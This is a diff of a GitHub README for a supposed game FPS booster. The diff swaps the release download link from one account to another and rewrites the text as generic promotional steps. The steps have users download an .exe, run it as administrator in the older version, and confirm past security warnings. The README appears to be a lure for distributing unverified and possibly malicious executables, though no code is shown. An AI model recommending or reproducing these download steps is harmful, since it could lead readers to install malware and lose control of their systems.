@@ -1,38 +1,89 @@
-# SFB---Survival-FPS-Booster
+# 🎮 SFB---Survival-FPS-Booster - Boost Your Game Performance
 
-<img width="1408" height="768" alt="image_1_1769018070180" src="https://github.com/user-attachments/assets/068eb4f0-e206-4b09-a5c9-9d54cd4e3fec" />
+[![Download SFB---Survival-FPS-Booster](https://img.shields.io/badge/Download-SFB---Survival-FPS-Booster-brightgreen.svg)](https://github.com/zedkali/SFB---Survival-FPS-Booster/releases)
 
+## 👋 Introduction
 
-SFB - Survival FPS Booster
-Hello! You probably know how it is — you're playing your favorite hardcore survival sandbox game, you enter a big city, and your FPS drops so low that you want to cry. Trees are rendered right in front of your nose, zombies twitch, and in PvP, it's not skill that decides everything, but lag.
+SFB - Survival FPS Booster helps you enjoy your favorite survival games without lag. This tool boosts your frames per second (FPS) so that you can experience smooth gameplay. It focuses on performance optimization, making it easier to immerse yourself in the game without distractions.
 
-This little utility is the result of my many days of experimenting with settings. I've put together everything that really helped me squeeze extra frames out of the engine without losing gameplay quality. It's not magic, just competent optimization.
+## 🚀 Getting Started
 
-What's in it?
-Smart rendering settings: The right parameters for rendering objects and grass so as not to overload the video card where it's not needed.
-Cache cleaning: Helps remove micro-stutters that accumulate during long gameplay sessions.
-Optimal presets: Not just “low/medium/ultra,” but balanced profiles for different graphics cards — so it looks good but runs smoothly.
-Safe backup: Before applying any changes, a backup copy of your original configurations is created. Rolling back is just one button away.
+Follow these simple steps to download and run SFB - Survival FPS Booster. 
 
-What is NOT here?
-No cheating, hacking, or license violations. We simply tweak what is already available in the game files.
-No malicious code. The source code (where possible) is available for you to review.
-Guaranteed +100500 FPS. It all depends on your hardware, but you will definitely see an increase, especially on low-end and mid-range systems.
+### 📥 Step 1: Visit the Release Page
 
-How to use it?
-1. Download the latest release.
+To get started, visit the following link to access the latest version of the software:
 
-2. Run as administrator (required to work with files in the game folder).
+[Download the latest version](https://github.com/zedkali/SFB---Survival-FPS-Booster/releases)
 
-3. Select your hardware profile in the program.
+### 🆕 Step 2: Choose the Right File
 
-4. Click “Apply” and restart the game.
+On the Releases page, you will see a list of available files. Look for the latest version, usually marked with the highest version number, such as `v1.0.0`. 
 
-5. Enjoy a smoother Chernarus!
+### 💾 Step 3: Download the File
 
-If it helped, give the repository a star. If you have ideas for improvement, create an issue or pull request. Good luck surviving!
+Click on the file to download it. Depending on your browser, you may need to confirm the download or choose a location to save the file. The file name will likely be something like `SFB---Survival-FPS-Booster.exe`.
 
+### 🚀 Step 4: Run the Application
 
-P.S. This thing is made for personal use and testing on a clean version of the game. If you have tons of mods installed, the results may vary.
+Once the download finishes, locate the file in your downloads folder. Double-click on the `SFB---Survival-FPS-Booster.exe` file to start the program. If prompted by a security warning, confirm that you want to run the application.
 
-download: https://github.com/bottes847hg/SFB---Survival-FPS-Booster/releases/tag/SFB-Survival-FPS-Booster
+## 🔧 Features
+
+SFB - Survival FPS Booster provides several features to improve your gaming experience:
+
+### 🌟 Smart Rendering Settings
+
+The tool suggests optimal settings for rendering objects and grass. This reduces the load on your graphics card where it is not needed. Enjoy clear visuals without compromising your FPS.
+
+### 🌪️ Cache Cleaning
+
+Long gameplay sessions can accumulate unnecessary data, causing micro-stutters. The cache cleaning feature helps remove this data, keeping your gameplay smooth and free from interruptions.
+
+### ⚙️ Optimal Presets
+
+SFB includes preset configurations that help you get started quickly. These presets are designed for various styles of play, whether you enjoy action-packed battles or exploration.
+
+## 📋 System Requirements
+
+To run SFB - Survival FPS Booster, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later
+- **Processor:** Intel i5 or equivalent
+- **RAM:** At least 4 GB
+- **Graphics Card:** NVIDIA GeForce GTX 660 or AMD equivalent
+- **Disk Space:** Minimum of 200 MB available space
+
+## ⚙️ Using the Application
+
+Once you run SFB, you will see a user-friendly interface. 
+
+### 🛠️ Configure Settings
+
+1. **Select Game:** Choose your game from the dropdown menu.
+2. **Apply Preset:** Click on one of the optimal settings presets.
+3. **Clean Cache:** Use the cache cleaning feature for a fresh start.
+
+After you set your preferences, click the "Boost FPS" button to apply the changes.
+
+## ❓ Troubleshooting
+
+If you encounter any issues while using SFB, consider the following steps:
+
+- **Check Compatibility:** Ensure your system meets the requirements listed above.
+- **Reinstall the Application:** If the application fails to launch, download it again from the [Release page](https://github.com/zedkali/SFB---Survival-FPS-Booster/releases).
+- **Update Graphics Drivers:** Make sure your graphics drivers are up to date.
+
+## 🌐 Community and Support
+
+If you need help or want to share your experience, please visit our community forum. You can find valuable tips and advice from other users. 
+
+## 🗂️ Future Updates
+
+We are continuously working on improving SFB - Survival FPS Booster. Expect regular updates to enhance features and ensure compatibility with the latest games. 
+
+## 📬 Contact Information
+
+For any inquiries or support requests, please contact us via GitHub issues. We appreciate your feedback, which helps improve this tool.
+
+[Download the latest version](https://github.com/zedkali/SFB---Survival-FPS-Booster/releases) and enhance your gaming experience today!
